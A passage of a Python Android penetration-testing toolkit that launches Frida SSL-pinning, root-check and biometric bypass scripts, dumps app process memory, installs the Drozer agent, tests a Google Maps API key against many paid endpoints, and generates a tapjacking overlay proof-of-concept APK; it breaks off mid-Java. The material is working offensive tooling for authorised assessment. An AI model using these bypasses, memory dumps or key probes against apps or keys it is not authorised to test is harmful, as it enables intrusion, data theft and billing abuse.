    print(Fore.GREEN + f"Using target application: {app_package}" + Style.RESET_ALL)
    cmd = f'frida -U -f {app_package} -l "{script_path}"'
    print(Fore.CYAN + f"🚀 Running SSL Pinning Bypass on {app_package}..." + Style.RESET_ALL)
    open_new_terminal(cmd)

def run_root_check_bypass():
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'frida-scripts', 'root-check-bypass.js')
    if not os.path.exists(script_path):
        print(Fore.RED + f"❌ Script not found at {script_path}. Ensure the script is in the 'frida-scripts' directory." + Style.RESET_ALL)
        return
    if not is_frida_server_running():
        print(Fore.YELLOW + "⚠️ Frida-Server is not running. Attempting to start it..." + Style.RESET_ALL)
        run_frida_server()
        if not is_frida_server_running():
            print(Fore.RED + "❌ Frida-Server is not running. Cannot proceed with Root Check Bypass." + Style.RESET_ALL)
            return
    global target_app
    if not target_app:
        print(Fore.YELLOW + "No target set. Please select a target application:" + Style.RESET_ALL)
        set_target_app()
        if not target_app:
            print(Fore.RED + "No target set. Aborting operation." + Style.RESET_ALL)
            return
    app_package = target_app
    print(Fore.GREEN + f"Using target application: {app_package}" + Style.RESET_ALL)
    cmd = f'frida -U -f {app_package} -l "{script_path}"'
    print(Fore.CYAN + f"🚀 Running Root Check Bypass on {app_package}..." + Style.RESET_ALL)
    open_new_terminal(cmd)

def android_biometric_bypass():
    script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'frida-scripts', 'android-biometric-bypass.js')
    if not os.path.exists(script_path):
        print(Fore.RED + f"❌ Script not found at {script_path}. Ensure the script is in the 'frida-scripts' directory." + Style.RESET_ALL)
        return
    if not is_frida_server_running():
        print(Fore.YELLOW + "⚠️ Frida-Server is not running. Attempting to start it..." + Style.RESET_ALL)
        run_frida_server()
        if not is_frida_server_running():
            print(Fore.RED + "❌ Frida-Server is not running. Cannot proceed with Android Biometric Bypass." + Style.RESET_ALL)
            return
    global target_app
    if not target_app:
        print(Fore.YELLOW + "No target set. Please select a target application:" + Style.RESET_ALL)
        set_target_app()
        if not target_app:
            print(Fore.RED + "No target set. Aborting operation." + Style.RESET_ALL)
            return
    app_package = target_app
    print(Fore.GREEN + f"Using target application: {app_package}" + Style.RESET_ALL)
    cmd = f'frida -U -f {app_package} -l "{script_path}"'
    print(Fore.CYAN + f"🚀 Running Android Biometric Bypass on {app_package}..." + Style.RESET_ALL)
    open_new_terminal(cmd)

def run_custom_frida_script():
    frida_scripts_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'frida-scripts')
    known_scripts = {
        'ssl-pinning-bypass.js',
        'root-check-bypass.js',
        'android-biometric-bypass.js'
    }
    if not os.path.exists(frida_scripts_dir):
        print(Fore.RED + f"❌ 'frida-scripts' directory does not exist at {frida_scripts_dir}." + Style.RESET_ALL)
        return

    all_scripts = {f for f in os.listdir(frida_scripts_dir) if f.endswith('.js')}
    unknown_scripts = all_scripts - known_scripts
    script_path = None

    if unknown_scripts:
        print(Fore.CYAN + "\n🔍 Detected custom scripts in 'frida-scripts':" + Style.RESET_ALL)
        unknown_scripts_list = list(unknown_scripts)
        for idx, script in enumerate(unknown_scripts_list, 1):
            print(f"{Fore.YELLOW}{idx}. {script}{Style.RESET_ALL}")
        use_existing = input(Fore.CYAN + "✨ Execute one of these custom scripts? (y/n): " + Style.RESET_ALL).strip().lower()
        if use_existing in ['y', 'yes']:
            script_choice = input(f"🎯 Enter the number (1-{len(unknown_scripts_list)}): ").strip()
            if script_choice.isdigit() and 1 <= int(script_choice) <= len(unknown_scripts_list):
                script_path = os.path.join(frida_scripts_dir, unknown_scripts_list[int(script_choice) - 1])
            else:
                print(Fore.RED + "❌ Invalid choice. Exiting." + Style.RESET_ALL)
                return
        else:
            print(Fore.YELLOW + "⚠️ It is recommended to place your custom script in 'frida-scripts'." + Style.RESET_ALL)
            script_path = input(Fore.CYAN + "📝 Enter the full path to your custom Frida script: " + Style.RESET_ALL).strip()
    else:
        print(Fore.YELLOW + "⚠️ No custom scripts detected in 'frida-scripts'." + Style.RESET_ALL)
        print(Fore.YELLOW + "⚠️ It is recommended to place your script in 'frida-scripts'." + Style.RESET_ALL)
        script_path = input(Fore.CYAN + "📝 Enter the full path to your custom Frida script: " + Style.RESET_ALL).strip()

    if not os.path.isfile(script_path):
        print(Fore.RED + f"❌ The script '{script_path}' does not exist or is invalid." + Style.RESET_ALL)
        return
    if not is_frida_server_running():
        print(Fore.YELLOW + "⚠️ Frida-Server is not running. Attempting to start it..." + Style.RESET_ALL)
        run_frida_server()
        if not is_frida_server_running():
            print(Fore.RED + "❌ Frida-Server is not running. Cannot proceed with the custom script." + Style.RESET_ALL)
            return
    list_installed_applications()
    global target_app
    if not target_app:
        print(Fore.YELLOW + "No target set. Please select a target application:" + Style.RESET_ALL)
        set_target_app()
        if not target_app:
            print(Fore.RED + "No target set. Aborting operation." + Style.RESET_ALL)
            return
    app_package = target_app
    print(Fore.GREEN + f"Using target application: {app_package}" + Style.RESET_ALL)
    cmd = f'frida -U -f {app_package} -l "{script_path}"'
    print(Fore.CYAN + f"🚀 Running custom Frida script on {app_package}..." + Style.RESET_ALL)
    open_new_terminal(cmd)

def auto_fridump():
    SESSION_FILE = "fridump_session.json"

    def load_session(filepath):
        if not os.path.isfile(filepath):
            return {"dumped_ranges": {}, "skipped_ranges": {}}
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                data = json.load(f)
            if not isinstance(data, dict) or "dumped_ranges" not in data or "skipped_ranges" not in data:
                return {"dumped_ranges": {}, "skipped_ranges": {}}
            return data
        except:
            return {"dumped_ranges": {}, "skipped_ranges": {}}

    def save_session(filepath, dumped, skipped):
        data = {"dumped_ranges": dumped, "skipped_ranges": skipped}
        try:
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            print(f"Error saving session: {e}")

    def print_progress(current, total, prefix='Progress:', bar_length=50):
        filled_length = int(bar_length * current // total)
        bar = '#' * filled_length + '-' * (bar_length - filled_length)
        print(f'\r{prefix} |{bar}| {current}/{total}', end='\r')
        if current == total:
            print()

    def run_strings(directory, min_len=4):
        strings_path = os.path.join(directory, "strings.txt")
        with open(strings_path, "w", encoding='utf-8') as st:
            for filename in os.listdir(directory):
                if filename.endswith(".data"):
                    filepath = os.path.join(directory, filename)
                    try:
                        with open(filepath, 'rb') as f:
                            content = f.read().decode('latin-1', errors='ignore')
                            strings = re.findall(r"[A-Za-z0-9/\-:;.,_$%'!()\[\]<>#]+", content)
                            for s in strings:
                                if len(s) >= min_len:
                                    st.write(s + "\n")
                    except:
                        continue

    def get_emulator_ip_inner():
        try:
            output = subprocess.check_output(["adb", "shell", "ip", "addr"], universal_newlines=True)
            match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/', output)
            if match:
                return match.group(1)
        except subprocess.CalledProcessError:
            pass
        return None

    def adb_forward():
        try:
            subprocess.check_call(["adb", "forward", "tcp:27042", "tcp:27042"])
            print(Fore.GREEN + "[*] ADB port forwarding set up: tcp:27042 -> tcp:27042" + Style.RESET_ALL)
        except subprocess.CalledProcessError as e:
            print(Fore.RED + f"[-] Error setting up ADB port forwarding: {e}" + Style.RESET_ALL)
            sys.exit(1)

    def run_frida_ps():
        try:
            result = subprocess.run(["frida-ps", "-Uia"], capture_output=True, text=True, check=True)
            lines = result.stdout.strip().split('\n')
            apps = []
            for line in lines[1:]:
                parts = line.split(None, 1)
                if len(parts) == 2 and parts[0].isdigit():
                    pid = int(parts[0])
                    app_name = parts[1].strip()
                    apps.append((pid, app_name))
            return apps
        except subprocess.CalledProcessError as e:
            print(Fore.RED + f"[-] Error running 'frida-ps -Uia': {e}" + Style.RESET_ALL)
            sys.exit(1)
        except FileNotFoundError:
            print(Fore.RED + "[-] 'frida-ps' not found. Please ensure Frida is installed and added to PATH." + Style.RESET_ALL)
            sys.exit(1)

    def dump_memory(agent, base, size, directory, max_size=20971520):
        def dump_to_file(addr, sz, fname):
            data = agent.readmemory(addr, sz)
            with open(os.path.join(directory, fname), 'wb') as f:
                f.write(data)
        if size > max_size:
            for i in range(0, size, max_size):
                chunk_size = min(max_size, size - i)
                dump_to_file(base + i, chunk_size, f"{hex(base + i)}_dump.data")
        else:
            dump_to_file(base, size, f"{hex(base)}_dump.data")

    def run_auto_dump():
        session = load_session(SESSION_FILE)
        dumped = session["dumped_ranges"]
        skipped = session["skipped_ranges"]

        ip = get_emulator_ip_inner()
        if not ip:
            print(Fore.RED + "[-] Unable to obtain emulator IP via ADB." + Style.RESET_ALL)
            sys.exit(1)
        print(Fore.GREEN + f"[*] Detected emulator IP: {ip}" + Style.RESET_ALL)

        adb_forward()

        host = "127.0.0.1:27042"
        try:
            device_manager = frida.get_device_manager()
            device = device_manager.add_remote_device(host)
            print(Fore.GREEN + f"[*] Connected to remote device: {host}" + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] Error connecting to remote device: {e}" + Style.RESET_ALL)
            sys.exit(1)

        apps = run_frida_ps()
        if not apps:
            print(Fore.YELLOW + "⚠️ No applications found." + Style.RESET_ALL)
            sys.exit(0)

        print(Fore.GREEN + "\n[*] Running applications:" + Style.RESET_ALL)
        print("{:<10} {}".format("PID", "Application"))
        print("-" * 40)
        for pid, app in apps:
            print("{:<10} {}".format(pid, app))

        try:
            pid_input = input(Fore.CYAN + "\nEnter the PID of the process to dump: " + Style.RESET_ALL).strip()
            pid = int(pid_input)
            if pid not in [app[0] for app in apps]:
                print(Fore.RED + "[-] PID not found in the list of running applications." + Style.RESET_ALL)
                sys.exit(1)
        except ValueError:
            print(Fore.RED + "[-] PID must be an integer." + Style.RESET_ALL)
            sys.exit(1)

        perms = input(Fore.CYAN + "Enter memory permissions to dump (default 'rw-'): " + Style.RESET_ALL).strip()
        if not perms:
            perms = "rw-"
        perms_list = [p.strip() for p in perms.split(',')]

        strings_flag = input(Fore.CYAN + "Do you want to run 'strings' on dumped files? (y/n, default n): " + Style.RESET_ALL).strip().lower() == 'y'

        output_dir = os.path.join(os.getcwd(), "dump")
        os.makedirs(output_dir, exist_ok=True)
        print(Fore.GREEN + f"[*] Output directory: {output_dir}" + Style.RESET_ALL)

        try:
            session_frida = device.attach(pid)
            print(Fore.GREEN + f"[*] Attached to process PID: {pid}" + Style.RESET_ALL)
        except frida.ProcessNotFoundError:
            print(Fore.RED + f"[-] Process with PID '{pid}' not found." + Style.RESET_ALL)
            sys.exit(1)
        except frida.TransportError as e:
            print(Fore.RED + f"[-] Transport error: {e}" + Style.RESET_ALL)
            sys.exit(1)
        except Exception as e:
            print(Fore.RED + f"[-] Unexpected error: {e}" + Style.RESET_ALL)
            sys.exit(1)

        script_code = """
        'use strict';
        rpc.exports = {
          enumerateranges: function (prot) {
            return Process.enumerateRangesSync(prot);
          },
          readmemory: function (address, size) {
            return Memory.readByteArray(ptr(address), size);
          }
        };
        """
        try:
            script = session_frida.create_script(script_code)
            script.load()
            agent = script.exports_sync
            print(Fore.GREEN + "[*] Frida script loaded successfully." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[-] Error loading Frida script: {e}" + Style.RESET_ALL)
            sys.exit(1)

        all_ranges = []
        for p in perms_list:
            try:
                ranges = agent.enumerateranges(p)
                print(Fore.GREEN + f"[*] Found {len(ranges)} regions with permissions '{p}'" + Style.RESET_ALL)
                all_ranges.extend(ranges)
            except Exception as e:
                print(Fore.RED + f"[-] Error enumerating regions for '{p}': {e}" + Style.RESET_ALL)

        if not all_ranges:
            print(Fore.YELLOW + "⚠️ No memory regions found with the specified permissions." + Style.RESET_ALL)
            sys.exit(0)

        unique_ranges = {r['base']: r for r in all_ranges}.values()
        sorted_ranges = sorted(unique_ranges, key=lambda x: x['base'])

        print(Fore.GREEN + f"[*] Total unique memory regions to dump: {len(sorted_ranges)}" + Style.RESET_ALL)

        for idx, region in enumerate(sorted_ranges, 1):
            base = region['base']
            size = region['size']

            if isinstance(base, str):
                try:
                    base_int = int(base, 16)
                except ValueError:
                    print(Fore.RED + f"[-] Invalid base address format: {base}" + Style.RESET_ALL)
                    skipped[base] = True
                    save_session(SESSION_FILE, dumped, skipped)
                    print_progress(idx, len(sorted_ranges))
                    continue
            elif isinstance(base, int):
                base_int = base
            else:
                print(Fore.RED + f"[-] Unexpected base address type: {type(base)} for base {base}" + Style.RESET_ALL)
                skipped[str(base)] = True
                save_session(SESSION_FILE, dumped, skipped)
                print_progress(idx, len(sorted_ranges))
                continue

            base_str = hex(base_int)

            if base_str in dumped or base_str in skipped:
                print_progress(idx, len(sorted_ranges))
                continue

            try:
                dump_memory(agent, base_int, size, output_dir)
                dumped[base_str] = True
                save_session(SESSION_FILE, dumped, skipped)
                print(Fore.GREEN + f"[+] Dumped region {base_str} (size={size} bytes)." + Style.RESET_ALL)
            except Exception as e:
                skipped[base_str] = True
                save_session(SESSION_FILE, dumped, skipped)
                print(Fore.RED + f"[-] Error dumping region {base_str}: {e}" + Style.RESET_ALL)
            print_progress(idx, len(sorted_ranges))

        if strings_flag:
            print(Fore.GREEN + "[*] Running 'strings' on dumped files..." + Style.RESET_ALL)
            run_strings(output_dir)
            print(Fore.GREEN + "[*] 'strings' extraction completed." + Style.RESET_ALL)

        print(Fore.GREEN + "[*] Memory dump completed." + Style.RESET_ALL)
        print(Fore.GREEN + f"[*] Session data saved in '{SESSION_FILE}'." + Style.RESET_ALL)

    run_auto_dump()

def install_drozer_agent():
    global adb_command, device_serial
    if adb_command is None or not device_serial:
        print(Fore.RED + "❌ ADB command unavailable or no device selected. Cannot install Drozer Agent." + Style.RESET_ALL)
        return

    print(Fore.CYAN + "🔎 Checking latest Drozer Agent release..." + Style.RESET_ALL)
    try:
        response = requests.get("https://api.github.com/repos/WithSecureLabs/drozer-agent/releases/latest", timeout=15)
        response.raise_for_status()
        release_data = response.json()
        assets = release_data.get("assets", [])
        apk_url = None

        for asset in assets:
            if asset["browser_download_url"].endswith(".apk"):
                apk_url = asset["browser_download_url"]
                break

        if not apk_url:
            print(Fore.RED + "❌ Could not find an .apk asset in the latest Drozer release." + Style.RESET_ALL)
            return

        print(Fore.CYAN + f"🔗 Downloading Drozer Agent from: {apk_url}" + Style.RESET_ALL)
        apk_filename = "drozer-agent-latest.apk"
        with requests.get(apk_url, stream=True) as r:
            r.raise_for_status()
            with open(apk_filename, 'wb') as f:
                for chunk in r.iter_content(chunk_size=8192):
                    f.write(chunk)
        print(Fore.GREEN + "✅ Drozer Agent APK downloaded successfully." + Style.RESET_ALL)

        install_command = f'install -r "{apk_filename}"'
        print(Fore.CYAN + "📦 Installing Drozer Agent APK on the device..." + Style.RESET_ALL)
        result = run_adb_command(install_command)
        if result and result.returncode == 0:
            print(Fore.GREEN + "✅ Drozer Agent installed successfully." + Style.RESET_ALL)
        else:
            print(Fore.RED + "❌ Installation failed. Check adb logs for details." + Style.RESET_ALL)

        try:
            os.remove(apk_filename)
        except Exception:
            pass

    except Exception as e:
        print(Fore.RED + f"❌ An error occurred while downloading or installing Drozer Agent: {e}" + Style.RESET_ALL)

def start_drozer_forwarding():
    global adb_command, device_serial
    if adb_command is None or not device_serial:
        print(Fore.RED + "❌ ADB command unavailable or no device selected. Cannot forward Drozer port." + Style.RESET_ALL)
        return
    result = run_adb_command("forward tcp:31415 tcp:31415")
    if result and result.returncode == 0:
        print(Fore.GREEN + "✅ ADB forward set up: 31415 -> 31415" + Style.RESET_ALL)
    else:
        print(Fore.RED + "❌ Failed to set up port forwarding. Check adb logs for details." + Style.RESET_ALL)

def scan_gmaps(apikey):
    vulnerable_services = []
    separator = "-" * 60

    print("\n" + separator)
    print(f"{Fore.CYAN}Starting Google Maps API scan...{Style.RESET_ALL}")
    print(separator)
    
    def colored_status(status):
        if status in [200, 302]:
            return f"{Fore.GREEN}{status}{Style.RESET_ALL}"
        else:
            return f"{Fore.RED}{status}{Style.RESET_ALL}"
    
    def test_get(service_name, url, vulnerability_condition):
        try:
            response = requests.get(url, verify=False)
        except Exception as e:
            print(f"{Fore.YELLOW}[{service_name}]{Style.RESET_ALL}")
            print(f" URL    : {Fore.CYAN}{url}{Style.RESET_ALL}")
            print(f" Status : {Fore.RED}Error: {e}{Style.RESET_ALL}")
            print(separator)
            return False

        status_colored = colored_status(response.status_code)
        vulnerable, reason = vulnerability_condition(response)
        
        print(f"{Fore.YELLOW}[{service_name}]{Style.RESET_ALL}")
        print(f" URL    : {Fore.CYAN}{url}{Style.RESET_ALL}")
        print(f" Status : {status_colored}")
        if vulnerable:
            print(f" Result : {Fore.GREEN}VULNERABLE{Style.RESET_ALL}")
        else:
            print(f" Result : {Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        print(f" Details: {reason}")
        print(separator)
        
        if vulnerable:
            vulnerable_services.append(service_name)
        return vulnerable

    def test_post(service_name, url, postdata, headers, vulnerability_condition):
        try:
            response = requests.post(url, data=postdata, verify=False, headers=headers)
        except Exception as e:
            print(f"{Fore.YELLOW}[{service_name}]{Style.RESET_ALL}")
            print(f" URL    : {Fore.CYAN}{url}{Style.RESET_ALL}")
            print(f" Status : {Fore.RED}Error: {e}{Style.RESET_ALL}")
            print(separator)
            return False

        status_colored = colored_status(response.status_code)
        vulnerable, reason = vulnerability_condition(response)
        
        print(f"{Fore.YELLOW}[{service_name}]{Style.RESET_ALL}")
        print(f" URL    : {Fore.CYAN}{url}{Style.RESET_ALL}")
        print(f" Status : {status_colored}")
        if vulnerable:
            print(f" Result : {Fore.GREEN}VULNERABLE{Style.RESET_ALL}")
        else:
            print(f" Result : {Fore.RED}Not Vulnerable{Style.RESET_ALL}")
        print(f" Details: {reason}")
        print(separator)
        
        if vulnerable:
            vulnerable_services.append(service_name)
        return vulnerable

    def no_error_condition(response):
        if response.status_code != 200:
            return False, f"HTTP {response.status_code} received."
        try:
            data = response.json()
            if ("error_message" not in data) and ("errorMessage" not in data):
                return True, "No error message found."
            else:
                err = data.get("error_message") or data.get("errorMessage")
                return False, f"Error: {err}"
        except Exception as e:
            return False, str(e)
    
    def static_maps_condition(response):
        if response.status_code == 200:
            return True, "HTTP 200 received."
        elif b"PNG" in response.content:
            return False, "PNG content returned."
        else:
            return False, f"Response: {response.content.decode(errors='ignore')}"
    
    def street_view_condition(response):
        if response.status_code == 200:
            return True, "HTTP 200 received."
        elif b"PNG" in response.content:
            return False, "PNG content returned."
        else:
            return False, f"Response: {response.content.decode(errors='ignore')}"
    
    def places_photo_condition(response):
        if response.status_code == 302:
            return True, "HTTP 302 (redirect) received."
        else:
            return False, "No redirect."
    
    def fcm_condition(response):
        if response.status_code == 200:
            return True, "HTTP 200 received."
        else:
            try:
                data = response.json()
                return False, f"Error: {data.get('error', 'Unknown error')}"
            except:
                return False, response.text

    def nearest_roads_condition(response):
        if response.status_code != 200:
            return False, f"HTTP {response.status_code} received."
        try:
            data = response.json()
            if "error" not in data:
                return True, "No error returned."
            else:
                return False, data["error"].get("message", "Error returned.")
        except Exception as e:
            return False, str(e)
    
    test_get("Static Maps API",
             "https://maps.googleapis.com/maps/api/staticmap?center=45%2C10&zoom=7&size=400x400&key=" + apikey,
             static_maps_condition)
    
    test_get("Street View API",
             "https://maps.googleapis.com/maps/api/streetview?size=400x400&location=40.720032,-73.988354&fov=90&heading=235&pitch=10&key=" + apikey,
             street_view_condition)
    
    test_get("Directions API",
             "https://maps.googleapis.com/maps/api/directions/json?origin=Disneyland&destination=Universal+Studios+Hollywood4&key=" + apikey,
             no_error_condition)
    
    test_get("Geocoding API",
             "https://maps.googleapis.com/maps/api/geocode/json?latlng=40,30&key=" + apikey,
             no_error_condition)
    
    test_get("Distance Matrix API",
             ("https://maps.googleapis.com/maps/api/distancematrix/json?units=imperial&origins=40.6655101,-73.89188969999998"
              "&destinations=40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592"
              "%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592%7C40.6905615%2C-73.9976592"
              "%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524%7C40.6860072%2C-73.6334271"
              "%7C40.598566%2C-73.7527626%7C40.659569%2C-73.933783%7C40.729029%2C-73.851524"
              "%7C40.6860072%2C-73.6334271%7C40.598566%2C-73.7527626&key=" + apikey),
             no_error_condition)
    
    test_get("Find Place from Text API",
             ("https://maps.googleapis.com/maps/api/place/findplacefromtext/json?"
              "input=Museum%20of%20Contemporary%20Art%20Australia&inputtype=textquery&"
              "fields=photos,formatted_address,name,rating,opening_hours,geometry&key=" + apikey),
             no_error_condition)
    
    test_get("Autocomplete API",
             "https://maps.googleapis.com/maps/api/place/autocomplete/json?input=Bingh&types=%28cities%29&key=" + apikey,
             no_error_condition)
    
    test_get("Elevation API",
             "https://maps.googleapis.com/maps/api/elevation/json?locations=39.7391536,-104.9847034&key=" + apikey,
             no_error_condition)
    
    test_get("Timezone API",
             "https://maps.googleapis.com/maps/api/timezone/json?location=39.6034810,-119.6822510&timestamp=1331161200&key=" + apikey,
             no_error_condition)
    
    test_get("Nearest Roads API",
             "https://roads.googleapis.com/v1/nearestRoads?points=60.170880,24.942795|60.170879,24.942796|60.170877,24.942796&key=" + apikey,
             nearest_roads_condition)
    
    test_post("Geolocation API",
              "https://www.googleapis.com/geolocation/v1/geolocate?key=" + apikey,
              postdata={'considerIp': 'true'},
              headers={'Content-Type': 'application/json', 'Authorization': 'key=' + apikey},
              vulnerability_condition=no_error_condition)
    
    test_get("Snap to Roads API",
             "https://roads.googleapis.com/v1/snapToRoads?path=-35.27801,149.12958|-35.28032,149.12907&interpolate=true&key=" + apikey,
             no_error_condition)
    
    test_get("Speed Limits API",
             "https://roads.googleapis.com/v1/speedLimits?path=38.75807927603043,-9.03741754643809&key=" + apikey,
             no_error_condition)
    
    test_get("Place Details API",
             "https://maps.googleapis.com/maps/api/place/details/json?place_id=ChIJN1t_tDeuEmsRUsoyG83frY4&fields=name,rating,formatted_phone_number&key=" + apikey,
             no_error_condition)
    
    test_get("Nearby Search-Places API",
             "https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=-33.8670522,151.1957362&radius=100&types=food&name=harbour&key=" + apikey,
             no_error_condition)
    
    test_get("Text Search-Places API",
             "https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants+in+Sydney&key=" + apikey,
             no_error_condition)
    
    test_get("Places Photo API",
             "https://maps.googleapis.com/maps/api/place/photo?maxwidth=400&photoreference=CnRtAAAATLZNl354RwP_9UKbQ_5Psy40texXePv4oAlgP4qNEkdIrkyse7rPXYGd9D_Uj1rVsQdWT4oRz4QrYAJNpFX7rzqqMlZw2h2E2y5IKMUZ7ouD_SlcHxYq1yL4KbKUv3qtWgTK0A6QbGh87GB3sscrHRIQiG2RrmU_jF4tENr9wGS_YxoUSSDrYjWmrNfeEHSGSc3FyhNLlBU&key=" + apikey,
             places_photo_condition)
    
    test_post("FCM API",
              "https://fcm.googleapis.com/fcm/send",
              postdata="{'registration_ids':['ABC']}",
              headers={'Content-Type': 'application/json', 'Authorization': 'key=' + apikey},
              vulnerability_condition=fcm_condition)
    
    print("\n" + separator)
    print(f"{Fore.CYAN}Scan Summary:{Style.RESET_ALL}")
    if vulnerable_services:
        for service in vulnerable_services:
            print(f"- {service}")
    else:
        print("No vulnerable services detected.")
    print("\nPricing references:")
    print("https://cloud.google.com/maps-platform/pricing")
    print("https://developers.google.com/maps/billing/gmp-billing")
    
    js_filename = "jsapi_test.html"
    js_content = (
        '<!DOCTYPE html><html><head>'
        '<script src="https://maps.googleapis.com/maps/api/js?key=' + apikey +
        '&callback=initMap&libraries=&v=weekly" defer></script>'
        '<style type="text/css">#map{height:100%;}html,body{height:100%;margin:0;padding:0;}</style>'
        '<script>function initMap(){var map=new google.maps.Map(document.getElementById("map"),'
        '{center:{lat:-34.397,lng:150.644},zoom:8});}</script>'
        '</head><body><div id="map"></div></body></html>'
    )
    try:
        with open(js_filename, "w+") as f:
            f.write(js_content)
        print(f"\nJS API test file '{js_filename}' generated automatically.")
        print("Open it in your browser to verify the JavaScript API functionality.")
    except Exception as e:
        print(f"Error generating JS API test file: {e}")
    
    return True

def tapjacking_apk_builder():
    """
    Fully automated APK generation for TapJacking PoC.
    Prompts for target app details and builds an unsigned APK.
    """
    global target_app
    
    # Check if target app is set, if not prompt to set it
    if not target_app:
        print(Fore.YELLOW + "⚠️ No target app set. Please select a target app first." + Style.RESET_ALL)
        set_target_app()
        if not target_app:
            print(Fore.RED + "❌ No target app selected. Aborting APK build." + Style.RESET_ALL)
            return
    
    package_name = target_app
    print(Fore.GREEN + f"Using target app: {package_name}" + Style.RESET_ALL)
    
    # Prompt for activity name
    activity_name = input("Enter the exported activity name to test: ")
    
    # Validate inputs
    if not activity_name:
        print("Error: Activity name cannot be empty.")
        sys.exit(1)
    
    print(f"\nBuilding tapjacking APK targeting:")
    print(f"- Package: {package_name}")
    print(f"- Activity: {activity_name}")
    print("-" * 40)
    
    # Helper function
    def ensure_directory_exists(path):
        """Create directory if it doesn't exist"""
        if not os.path.exists(path):
            os.makedirs(path)

    # Setup paths
    base_dir = os.path.dirname(os.path.abspath(__file__))
    project_dir = os.path.join(base_dir, "Tapjacking-ExportedActivity")
    
    # Find Android SDK
    sdk_path = os.path.join(os.environ['LOCALAPPDATA'], 'Android', 'Sdk')
    if not os.path.exists(sdk_path):
        print("Error: Android SDK not found.")
        print("Please install Android Studio and the Android SDK.")
        sys.exit(1)

    # Find build tools
    build_tools_path = os.path.join(sdk_path, 'build-tools')
    if not os.path.exists(build_tools_path):
        print("Error: Android build tools not found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    # Get latest build tools version
    versions = [d for d in os.listdir(build_tools_path) if os.path.isdir(os.path.join(build_tools_path, d))]
    if not versions:
        print("Error: No build tools versions found.")
        print("Please install build tools using Android Studio SDK Manager.")
        sys.exit(1)

    latest_version = sorted(versions)[-1]
    tools_path = os.path.join(build_tools_path, latest_version)

    # Setup project structure
    print("Setting up project...")
    if os.path.exists(project_dir):
        shutil.rmtree(project_dir)
    
    # Create project directories
    src_dir = os.path.join(project_dir, "src")
    java_dir = os.path.join(src_dir, "com", "tapjacking", "demo")
    res_dir = os.path.join(project_dir, "res")
    
    ensure_directory_exists(java_dir)
    ensure_directory_exists(os.path.join(res_dir, "layout"))
    ensure_directory_exists(os.path.join(res_dir, "values"))
    
    # Write Android Manifest
    manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.tapjacking.demo">
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <application
        android:allowBackup="true"
        android:label="TapjackingDemo">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service
            android:name=".OverlayService"
            android:enabled="true"
            android:exported="false" />
    </application>
</manifest>'''

    with open(os.path.join(project_dir, "AndroidManifest.xml"), 'w') as f:
        f.write(manifest)

    # Write layout file
    layout = '''<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#80000000">
    <Button
        android:id="@+id/sampleButton"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_centerInParent="true"
        android:text="Tapjacking Running" />
</RelativeLayout>'''

    with open(os.path.join(res_dir, "layout", "overlay_layout.xml"), 'w') as f:
        f.write(layout)

    # Write strings.xml
    strings = '''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">TapjackingDemo</string>
</resources>'''

    with open(os.path.join(res_dir, "values", "strings.xml"), 'w') as f:
        f.write(strings)

    # Write MainActivity.java
    main_activity = f'''
package com.tapjacking.demo;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;

public class MainActivity extends Activity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        checkOverlayPermission();
    }}

    private void checkOverlayPermission() {{
        if (!Settings.canDrawOverlays(this)) {{
            Intent intent = new Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName())
            );
            startActivityForResult(intent, 1);
        }} else {{
            startService(new Intent(this, OverlayService.class));
            finish();
        }}
    }}

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {{
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == 1) {{
            if (Settings.canDrawOverlays(this)) {{
                startService(new Intent(this, OverlayService.class));
                finish();
            }} else {{
                Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
            }}
        }}
    }}
}}'''

    with open(os.path.join(java_dir, "MainActivity.java"), 'w') as f:
        f.write(main_activity)

    # Write OverlayService.java
    overlay_service = f'''
package com.tapjacking.demo;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.os.Build;

@SuppressLint("ClickableViewAccessibility")
public class OverlayService extends Service {{
    private WindowManager windowManager;
    private View overlayView;

    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}

    @Override
    public void onCreate() {{
        super.onCreate();

        Intent externalIntent = new Intent();
        externalIntent.setClassName("{package_name}", "{activity_name}");
        externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(externalIntent);

        // Use Handler with Looper to avoid deprecation warnings
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {{
            @Override
            public void run() {{
